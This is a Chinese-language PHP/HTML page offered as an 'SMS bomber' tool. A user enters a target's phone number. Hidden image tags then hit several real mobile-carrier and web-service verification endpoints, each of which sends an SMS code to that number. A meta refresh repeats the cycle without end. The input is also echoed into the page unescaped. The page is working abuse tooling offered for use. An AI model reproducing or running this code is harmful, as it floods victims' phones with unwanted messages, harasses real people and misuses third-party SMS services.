<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<link rel="stylesheet" href="css.css" type="text/css"/>
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
<title>短信炸弹</title>
</head>
<body>

<div class="container">

<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">短信轰炸器<span class="label label-success" style="float: right;" onclick="window.open('http://blog.0907.org/', '_new')"><strong>由无名强力驱动</strong></span></h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">+86</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止轰炸线程</button>

		</div>
		</form>


<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<div class="tip">
<?php
$i=139;//想要屏蔽的手机号
if($i==$d){
   echo "<br><br><H4>本手机号禁止发送垃圾短信</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>短信轰炸已启动,  对<strong>$d</strong>,已经发起<strong>$e</strong>.波轰炸,如不信请自测</div></div>";
    echo "<div style='display:none'><img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://t.12580.com/special/sendValidcodeByWap.do?mobile=$d&valicode=' alt=''/>
<img src='http://w.sohu.com/t2/tologin.do?mnd=$d&qr=1' alt=''/>
<img src='http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&templateDir=template&theme=simple&name=querySMSValiCode&id=querySMSValiCode&downId=&operateType=1&isPass=true&user.asidountName=$d&Submit=?E4?B8?8B?E4?B8?80?E6?AD?A5' alt=''/>
<img src='http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=$d&p=72' alt=''/>
<img src='https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=$d&SMS_CD=URM001&typ=Y&r=0.9636801626045905' alt=''/>
<img src='https://feixin.10086.cn/asidount/RegisterLv3Ajax?stype=m&stext=$d' alt=''/>
</div>";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'";
}
?>
</div>
</body>
</html>